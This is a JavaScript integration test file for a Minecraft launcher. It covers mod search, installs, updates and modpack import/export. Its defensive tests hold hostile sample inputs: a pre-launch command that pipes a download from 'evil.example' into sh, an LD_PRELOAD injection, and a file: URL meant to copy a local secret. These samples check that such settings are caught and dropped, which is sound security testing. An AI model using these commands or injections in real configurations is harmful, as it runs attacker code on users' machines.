// Integration tests for search/install/update/modpacks against the offline API mock.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const fsp = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');

const ROOT = path.resolve(__dirname, '..');
const http = require('../src/main/util/http');
const mock = require('../scripts/mock-net.cjs');
http.setFetch(mock.fetch);

const { PrismContext } = require('../src/main/prism/paths');
const { AppConfig } = require('../src/main/appconfig');
const { Instances } = require('../src/main/prism/instances');
const { Content, readMetadata } = require('../src/main/prism/content');
const { TaskManager } = require('../src/main/tasks');
const { Platforms } = require('../src/main/platforms/unified');
const { Modpacks } = require('../src/main/platforms/modpacks');
const { Meta } = require('../src/main/platforms/meta');
const { setKeyProvider } = require('../src/main/platforms/curseforge');
const { IniFile } = require('../src/main/util/ini');

let tmp, data, ctx, cfg, instances, content, platforms, modpacks, tasks;
let cfKey = 'test-key';
setKeyProvider(() => cfKey);

test.before(async () => {
  tmp = await fsp.mkdtemp(path.join(os.tmpdir(), 'havihub-plat-'));
  data = path.join(tmp, 'PrismLauncher');
  execFileSync(process.execPath, [path.join(ROOT, 'scripts', 'make-fixtures.mjs'), data]);
  ctx = new PrismContext(data, null);
  cfg = new AppConfig(path.join(tmp, 'ud'));
  await cfg.load();
  tasks = new TaskManager(() => {});
  instances = new Instances(ctx, cfg);
  content = new Content(instances, path.join(tmp, 'cache'));
  platforms = new Platforms({ instances, content, tasks, appConfig: cfg, emit: () => {} });
  modpacks = new Modpacks({ ctxProvider: () => ctx, instances, tasks, appConfig: cfg, emit: () => {} });
});

// Windows can still hold a file of the last import or export for a moment: retry
test.after(() => fsp.rm(tmp, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 }));

test('search: modrinth, curseforge and both (deduplicated)', async () => {
  const mr = await platforms.search({ source: 'modrinth', type: 'mod', query: '' });
  assert.ok(mr.hits.length > 5);
  assert.ok(mr.hits.every((h) => h.source === 'modrinth'));
  const cf = await platforms.search({ source: 'curseforge', type: 'mod' });
  assert.ok(cf.hits.every((h) => h.source === 'curseforge'));
  const both = await platforms.search({ source: 'both', type: 'mod', limit: 40 });
  const sodium = both.hits.filter((h) => h.title === 'Sodium');
  assert.equal(sodium.length, 1, 'Sodium appears once');
  // CurseForge copy was updated 1 day ago vs 6 days on Modrinth -> CurseForge wins
  assert.equal(sodium[0].source, 'curseforge');
  assert.equal(sodium[0].alsoOn.source, 'modrinth');
  const fapi = both.hits.filter((h) => h.title === 'Fabric API');
  assert.equal(fapi.length, 1);
  assert.equal(fapi[0].source, 'modrinth'); // 2 days vs 9 days
  assert.deepEqual(both.errors, {});
});

test('search without CurseForge key reports it but still returns Modrinth', async () => {
  cfKey = '';
  const both = await platforms.search({ source: 'both', type: 'modpack' });
  assert.equal(both.errors.curseforge.code, 'CF_NO_KEY');
  assert.ok(both.hits.length > 0);
  cfKey = 'test-key';
});

test('project details from both sources', async () => {
  const p = await platforms.project('modrinth', 'iris');
  assert.equal(p.title, 'Iris Shaders');
  assert.equal(p.bodyFormat, 'markdown');
  assert.equal(p.author, 'coderbot');
  assert.equal(p.gallery.length, 3);
  const c = await platforms.project('curseforge', '238222');
  assert.equal(c.bodyFormat, 'html');
  assert.ok(c.body.includes('<h2>'));
});

test('install a mod with its required dependency detection', async () => {
  const r = await platforms.install({ source: 'modrinth', projectId: 'gvQqBUqZ', instanceId: '26.2 Vanilla', type: 'mod', title: 'Lithium' });
  assert.equal(r.installed.length, 1, JSON.stringify(r));
  assert.equal(r.installed[0].title, 'Lithium');
  // fabric-api already installed (detected by mod id even without matching metadata)
  assert.equal(r.installed.filter((i) => i.isDep).length, 0);
  const meta = await readMetadata(path.join(data, 'instances', '26.2 Vanilla', 'minecraft', 'mods', '.index'));
  const m = [...meta.values()].find((x) => x.projectId === 'gvQqBUqZ');
  assert.ok(m);
  assert.equal(m.provider, 'modrinth');
  assert.equal(m.download['hash-format'], 'sha512');
  assert.deepEqual(m.mcVersions, ['26.2']);
  // installing again is skipped
  const again = await platforms.install({ source: 'modrinth', projectId: 'gvQqBUqZ', instanceId: '26.2 Vanilla', type: 'mod' });
  assert.equal(again.skipped.length, 1);
});

test('install into an instance without the dependency installs it too', async () => {
  const id = await instances.create({ name: 'Deps test', mcVersion: '26.2', loader: 'fabric', loaderVersion: '0.20.1' });
  const r = await platforms.install({ source: 'modrinth', projectId: 'mOgUt4GM', instanceId: id, type: 'mod', title: 'Mod Menu' });
  const titles = r.installed.map((i) => i.title).sort();
  assert.deepEqual(titles, ['Fabric API', 'Mod Menu']);
  const files = fs.readdirSync(path.join(data, 'instances', id, 'minecraft', 'mods')).filter((f) => f.endsWith('.jar'));
  assert.equal(files.length, 2);
});

test('update check and update', async () => {
  const id = await instances.create({ name: 'Update test', mcVersion: '26.2', loader: 'fabric', loaderVersion: '0.20.1' });
  const versions = mock.mrVersions(mock.MR.find((x) => x[1] === 'appleskin'), { game_versions: ['26.2'] });
  const older = versions[versions.length - 1];
  const r = await platforms.install({ source: 'modrinth', projectId: 'EsAfCjCV', versionId: older.id, instanceId: id, type: 'mod' });
  assert.equal(r.installed[0].version, older.version_number);
  const upd = await platforms.checkUpdates(id, 'mods');
  const entries = Object.entries(upd.updates);
  const apple = entries.find(([f]) => f.startsWith('appleskin'));
  assert.ok(apple, JSON.stringify(upd));
  assert.equal(apple[1].versionId, versions[0].id);
  // disable it, then update: stays disabled
  await content.setEnabled(id, 'mods', apple[0], false);
  await platforms.checkUpdates(id, 'mods');
  const all = await platforms.updateAll(id, 'mods');
  assert.ok(all.installed.some((i) => i.title === 'AppleSkin'));
  const files = fs.readdirSync(path.join(data, 'instances', id, 'minecraft', 'mods'));
  assert.ok(files.some((f) => f.startsWith('appleskin-1.4.0') && f.endsWith('.disabled')), files.join(','));
  assert.ok(!files.some((f) => f.startsWith('appleskin-1.3.0')));
});

test('curseforge install with blocked file reported', async () => {
  const id = await instances.create({ name: 'CF test', mcVersion: '26.2', loader: 'fabric', loaderVersion: '0.20.1' });
  const ok = await platforms.install({ source: 'curseforge', projectId: '238222', instanceId: id, type: 'mod' });
  assert.equal(ok.installed.length, 1);
  const meta = await readMetadata(path.join(data, 'instances', id, 'minecraft', 'mods', '.index'));
  assert.equal([...meta.values()][0].provider, 'curseforge');
  const blocked = await platforms.install({ source: 'curseforge', projectId: '711228', instanceId: id, type: 'mod' });
  assert.equal(blocked.blocked.length, 1);
  assert.ok(blocked.blocked[0].url.includes('curseforge.com'));
});

test('curseforge world goes into saves (twice = two worlds)', async () => {
  const id = await instances.create({ name: 'World test', mcVersion: '26.2' });
  const r = await platforms.install({ source: 'curseforge', projectId: '530100', instanceId: id, type: 'world', title: 'SkyBlock Clásico' });
  assert.deepEqual(r.failed, []);
  assert.equal(r.installed.length, 1);
  const saves = path.join(data, 'instances', id, 'minecraft', 'saves');
  assert.ok(fs.existsSync(path.join(saves, r.installed[0].fileName, 'level.dat')));
  assert.ok(fs.existsSync(path.join(saves, r.installed[0].fileName, 'region', 'r.0.0.mca')));
  const r2 = await platforms.install({ source: 'curseforge', projectId: '530100', instanceId: id, type: 'world' });
  assert.notEqual(r2.installed[0].fileName, r.installed[0].fileName, 'a second copy, never over the first');
  const { Worlds } = require('../src/main/prism/worlds');
  const list = await new Worlds(instances).list(id);
  assert.equal(list.filter((w) => w.levelName === 'SkyBlock Clásico').length, 2);
  await assert.rejects(platforms.install({ source: 'modrinth', projectId: 'x', instanceId: id, type: 'world' }));
});

test('install Modrinth modpack creates a managed instance', async () => {
  const r = await modpacks.install({ source: 'modrinth', projectId: '1KVo5zza', name: 'Fabulously Optimized', group: 'Packs', icon: null });
  const inst = await instances.get(r.id);
  assert.equal(inst.mcVersion, '26.2');
  assert.equal(inst.loader.id, 'fabric');
  assert.equal(inst.group, 'Packs');
  assert.equal(inst.managed.type, 'modrinth');
  assert.equal(inst.managed.id, '1KVo5zza');
  const mods = fs.readdirSync(path.join(inst.gameDir, 'mods'));
  assert.equal(mods.length, 3);
  assert.ok(fs.existsSync(path.join(inst.gameDir, 'config', 'sample.json5')));
  // overrides options.txt wins over defaults
  assert.match(fs.readFileSync(path.join(inst.gameDir, 'options.txt'), 'utf8'), /renderDistance:12/);
});

test('install CurseForge modpack resolves files and reports blocked ones', async () => {
  const r = await modpacks.install({ source: 'curseforge', projectId: '925200', name: 'All the Mods 10' });
  const inst = await instances.get(r.id);
  assert.equal(inst.mcVersion, '1.21.1');
  assert.equal(inst.loader.id, 'neoforge');
  assert.equal(inst.loader.version, '21.1.200');
  assert.equal(inst.managed.type, 'flame');
  assert.equal(r.blocked.length, 1);
  const mods = fs.readdirSync(path.join(inst.gameDir, 'mods')).filter((f) => f.endsWith('.jar'));
  assert.equal(mods.length, 1);
  assert.ok(fs.existsSync(path.join(inst.gameDir, 'config', 'pack.toml')));
});

test('export mrpack and re-import it', async () => {
  const src = (await instances.list()).instances.find((i) => i.name === 'Fabulously Optimized');
  const dest = path.join(tmp, 'fo.mrpack');
  await modpacks.exportMrpack(src.id, dest, { name: 'FO export' });
  const r = await modpacks.importArchive(dest, {});
  const inst = await instances.get(r.id);
  assert.equal(inst.name, 'FO export');
  assert.equal(fs.readdirSync(path.join(inst.gameDir, 'mods')).filter((f) => f.endsWith('.jar')).length, 3);
  // prism zip export/import
  const zipDest = path.join(tmp, 'inst.zip');
  await modpacks.exportZip('26.2 Vanilla', zipDest, { includeWorlds: false });
  const r2 = await modpacks.importArchive(zipDest, { group: 'Importadas' });
  const i2 = await instances.get(r2.id);
  assert.equal(i2.group, 'Importadas');
  assert.ok(!fs.existsSync(path.join(i2.gameDir, 'saves')));
  const cfgFile = await IniFile.load(path.join(i2.root, 'instance.cfg'));
  assert.equal(cfgFile.get('uuid', ''), '');
});

// A .mrpack lists where each file comes from. Only HTTPS addresses count
// (Modrinth's format asks for them): a file: address would copy any file of
// this computer into the profile, and on Windows a file://server/share one
// would connect to that server and hand it the person's credentials.
test('mrpack: only HTTPS downloads, tried in order, checked with the best hash', async () => {
  const secret = path.join(tmp, 'secret.txt');
  await fsp.writeFile(secret, 'not for the pack');
  const good = Buffer.from('mirror jar');
  const sha512 = require('node:crypto').createHash('sha512').update(good).digest('hex');
  const routes = {
    'https://broken.example/a.jar': { status: 404 },
    'https://mirror.example/a.jar': { body: good },
    'https://cdn.example/b.jar': { body: Buffer.from('changed in transit') },
  };
  const index = {
    formatVersion: 1,
    game: 'minecraft',
    versionId: '1',
    name: 'Hostile pack',
    dependencies: { minecraft: '26.2', 'fabric-loader': '0.16.0' },
    files: [
      { path: 'config/leak.txt', downloads: [require('node:url').pathToFileURL(secret).href], hashes: {} },
      { path: 'mods/a.jar', downloads: ['https://broken.example/a.jar', 'https://mirror.example/a.jar'], hashes: { sha1: '0'.repeat(40), sha512 } },
      { path: 'mods/b.jar', downloads: ['https://cdn.example/b.jar'], hashes: { sha512: 'f'.repeat(128) } },
    ],
  };
  const file = path.join(tmp, 'hostile.mrpack');
  await require('../src/main/util/zip').writeZip(file, [{ name: 'modrinth.index.json', buffer: Buffer.from(JSON.stringify(index)) }]);
  http.setFetch(async (url, opts) => {
    const r = routes[url];
    if (r) return new Response(r.body || null, { status: r.status || 200 });
    return mock.fetch(url, opts);
  });
  try {
    const r = await modpacks.importArchive(file, {});
    const inst = await instances.get(r.id);
    assert.ok(!fs.existsSync(path.join(inst.gameDir, 'config', 'leak.txt')), 'a file: address must not copy a local file');
    // the first address failed, the mirror worked, and its sha512 (not the wrong sha1) decided
    assert.equal(fs.readFileSync(path.join(inst.gameDir, 'mods', 'a.jar'), 'utf8'), 'mirror jar');
    assert.ok(!fs.existsSync(path.join(inst.gameDir, 'mods', 'b.jar')), 'a file that does not match its hash is not kept');
    assert.deepEqual(r.failed.map((f) => f.title).sort(), ['config/leak.txt', 'mods/b.jar']);
  } finally {
    http.setFetch(mock.fetch);
  }
});

test('meta: versions and loaders from Prism meta', async () => {
  const meta = new Meta(path.join(tmp, 'cache'), () => '');
  const mc = await meta.minecraftVersions();
  assert.ok(mc.find((v) => v.version === '26.2' && v.type === 'release'));
  const fabric = await meta.loaderVersions('fabric', '26.2');
  assert.ok(fabric.length > 10);
  assert.ok(fabric.some((v) => v.recommended));
  const neo = await meta.loaderVersions('neoforge', '26.3');
  assert.ok(neo.length > 0);
  assert.ok(neo.every((v) => v.version.startsWith('26.3')));
  const loaders = await meta.loadersFor('26.2');
  assert.ok(loaders.includes('fabric'));
});

// A Prism instance someone exported can bring settings that run something on
// this computer when the game starts. They are listed before importing it, and
// stay only if the person chooses so.
test('prism zip: settings that run something are found, and dropped unless kept', async () => {
  const { riskyLaunchSettings } = require('../src/main/prism/launchsettings');
  const cfg = [
    '[General]',
    'ConfigVersion=1.3',
    'InstanceType=OneSix',
    'name=Shared',
    'OverrideCommands=true',
    'PreLaunchCommand=curl https://evil.example/x | sh',
    'OverrideJavaArgs=true',
    'JvmArgs=-Xmx4G -javaagent:agent.jar',
    'OverrideEnv=true',
    'Env="{\\"LD_PRELOAD\\":\\"/tmp/x.so\\",\\"MESA_GL_VERSION_OVERRIDE\\":\\"4.5\\"}"',
    'OverrideMemory=true',
    'MaxMemAlloc=4096',
  ].join('\n');
  const file = path.join(tmp, 'shared-instance.zip');
  await require('../src/main/util/zip').writeZip(file, [
    { name: 'Shared/instance.cfg', buffer: Buffer.from(cfg) },
    { name: 'Shared/mmc-pack.json', buffer: Buffer.from(JSON.stringify({ formatVersion: 1, components: [{ uid: 'net.minecraft', version: '26.2' }] })) },
  ]);
  const found = await modpacks.archiveLaunchSettings(file);
  assert.deepEqual(found.map((f) => f.key), ['PreLaunchCommand', 'JvmArgs', 'Env LD_PRELOAD']);

  // without an answer (or "drop"): imported without them, the rest stays
  const dropped = await modpacks.importArchive(file, {});
  const c1 = await IniFile.load(path.join((await instances.get(dropped.id)).root, 'instance.cfg'));
  assert.deepEqual(riskyLaunchSettings(c1), []);
  assert.equal(c1.get('PreLaunchCommand', ''), '');
  assert.equal(String(c1.get('MaxMemAlloc')), '4096');
  assert.match(String(c1.get('Env')), /MESA_GL_VERSION_OVERRIDE/);
  assert.doesNotMatch(String(c1.get('Env')), /LD_PRELOAD/);

  // "keep": as it came
  const kept = await modpacks.importArchive(file, { launchSettings: 'keep' });
  const c2 = await IniFile.load(path.join((await instances.get(kept.id)).root, 'instance.cfg'));
  assert.equal(riskyLaunchSettings(c2).length, 3);

  // modpacks have no instance.cfg: nothing to ask
  const mr = path.join(tmp, 'fo.mrpack');
  if (fs.existsSync(mr)) assert.deepEqual(await modpacks.archiveLaunchSettings(mr), []);
});

// Sharing a profile as a Prism .zip: its commands, its own Java and its
// environment variables are this computer's (and can hold tokens), so they are
// left out unless the person chooses to share them.
test('prism zip export: commands, Java and variables of this computer stay out unless shared', async () => {
  const { riskyLaunchSettings } = require('../src/main/prism/launchsettings');
  // a profile with some of its own
  const created = await modpacks.importArchive(path.join(tmp, 'shared-instance.zip'), { launchSettings: 'keep' });
  const root = (await instances.get(created.id)).root;
  const own = await IniFile.load(path.join(root, 'instance.cfg'));
  own.set('OverrideJavaLocation', true);
  own.set('JavaPath', '/home/someone/jdks/21/bin/java');
  own.set('Env', JSON.stringify({ LD_PRELOAD: '/tmp/x.so', GITHUB_TOKEN: 'ghp_secret' }));
  await own.save();
  assert.deepEqual((await modpacks.exportSettings(created.id)).map((f) => f.key), ['PreLaunchCommand', 'JavaPath', 'JvmArgs', 'Env LD_PRELOAD', 'Env GITHUB_TOKEN']);
  const cfgOf = async (zipFile) => {
    const names = await require('../src/main/util/zip').listEntries(zipFile);
    return new IniFile((await require('../src/main/util/zip').readEntry(zipFile, names.find((n) => /(^|\/)instance\.cfg$/.test(n)))).toString('utf8'));
  };
  // by default: none of them, the rest of the settings stay
  const out = path.join(tmp, 'export-drop.zip');
  await modpacks.exportZip(created.id, out, {});
  const c1 = await cfgOf(out);
  assert.deepEqual(riskyLaunchSettings(c1), []);
  assert.equal(c1.get('JavaPath', ''), '');
  assert.doesNotMatch(String(c1.get('Env', '')), /GITHUB_TOKEN|LD_PRELOAD/);
  assert.equal(String(c1.get('MaxMemAlloc')), '4096');
  assert.match(fs.readFileSync(path.join(root, 'instance.cfg'), 'utf8'), /ghp_secret/, 'the profile itself is not changed');
  // shared on purpose: as they are
  const kept = path.join(tmp, 'export-keep.zip');
  await modpacks.exportZip(created.id, kept, { personalSettings: 'keep' });
  assert.match(String((await cfgOf(kept)).get('Env', '')), /ghp_secret/);
});

// A modpack that brings its own options.txt replaces the one Havi Hub wrote
// with the person's key bindings. With keys of its own, the person is asked
// ('modpack:keys'); without them, the person's are applied on top.
test('modpack keys: asked when the pack brings its own, applied when it does not', async () => {
  const events = [];
  const mp = new Modpacks({ ctxProvider: () => ctx, instances, tasks, appConfig: cfg, emit: (ch, x) => events.push([ch, x]) });
  const before = cfg.get().inGameDefaults;
  await cfg.replaceKey('inGameDefaults', { ...before, enabled: true, keys: { 'key.drop': 'key.keyboard.g' } });
  const pack = async (name, options) => {
    const file = path.join(tmp, `${name}.mrpack`);
    const index = { formatVersion: 1, game: 'minecraft', versionId: '1', name, dependencies: { minecraft: '26.2', 'fabric-loader': '0.20.1' }, files: [] };
    const items = [{ name: 'modrinth.index.json', buffer: Buffer.from(JSON.stringify(index)) }];
    if (options !== null) items.push({ name: 'overrides/options.txt', buffer: Buffer.from(options) });
    await require('../src/main/util/zip').writeZip(file, items);
    return file;
  };
  const optionsOf = async (id) => fs.readFileSync(path.join((await instances.get(id)).gameDir, 'options.txt'), 'utf8');
  try {
    // the pack's own keys: asked, nothing changed yet
    const a = await mp.installMrpack(await pack('Keys pack', 'fov:0.0\nkey_key.drop:key.keyboard.q\n'), {});
    assert.equal(a.keys, 'ask');
    assert.deepEqual(events.filter(([ch]) => ch === 'modpack:keys').map(([, x]) => [x.id, x.name]), [[a.id, 'Keys pack']]);
    assert.match(await optionsOf(a.id), /key_key\.drop:key\.keyboard\.q/);
    // the person chose theirs: their keys, the pack's other options stay
    assert.equal(await instances.applyKeysTo(a.id), true);
    const after = await optionsOf(a.id);
    assert.match(after, /key_key\.drop:key\.keyboard\.g/);
    assert.match(after, /fov:0\.0/);
    // options without keys: the person's are applied, nobody is asked
    events.length = 0;
    const b = await mp.installMrpack(await pack('Options pack', 'fov:0.5\n'), {});
    assert.equal(b.keys, 'applied');
    assert.equal(events.filter(([ch]) => ch === 'modpack:keys').length, 0);
    assert.match(await optionsOf(b.id), /key_key\.drop:key\.keyboard\.g/);
    // no options.txt in the pack: the one Havi Hub wrote stays, nothing to ask
    const c = await mp.installMrpack(await pack('Plain pack', null), {});
    assert.equal(c.keys, null);
    assert.match(await optionsOf(c.id), /key_key\.drop:key\.keyboard\.g/);
    // no keys of the person's own: nothing to ask
    await cfg.replaceKey('inGameDefaults', { ...before, enabled: true, keys: {} });
    const d = await mp.installMrpack(await pack('Keys pack 2', 'key_key.drop:key.keyboard.q\n'), {});
    assert.equal(d.keys, null);
  } finally {
    await cfg.replaceKey('inGameDefaults', before);
  }
});

// Minecraft upgrades an options.txt from its "version:" line; with none it
// runs the upgrade for pre-1.13 numeric keys, which fails on
// "key.keyboard.g" and throws the whole file away. Havi Hub's files say they
// are current; one the game saved keeps its own version.
test('options.txt written by Havi Hub says which version it is', async () => {
  const before = cfg.get().inGameDefaults;
  await cfg.replaceKey('inGameDefaults', { ...before, enabled: true, keys: { 'key.drop': 'key.keyboard.g' } });
  try {
    const id = await instances.create({ name: 'Options version', mcVersion: '26.2', loader: 'fabric', loaderVersion: '0.20.1' });
    const file = path.join((await instances.get(id)).gameDir, 'options.txt');
    const lines = fs.readFileSync(file, 'utf8').split('\n');
    assert.equal(lines[0], 'version:999999');
    assert.ok(lines.includes('key_key.drop:key.keyboard.g'));
    // a file the game saved: its version stays
    fs.writeFileSync(file, 'version:4440\nfov:0.0\nkey_key.drop:key.keyboard.q\n');
    assert.equal(await instances.applyKeysTo(id), true);
    const after = fs.readFileSync(file, 'utf8');
    assert.match(after, /^version:4440$/m);
    assert.doesNotMatch(after, /999999/);
    assert.match(after, /^key_key\.drop:key\.keyboard\.g$/m);
  } finally {
    await cfg.replaceKey('inGameDefaults', before);
  }
});
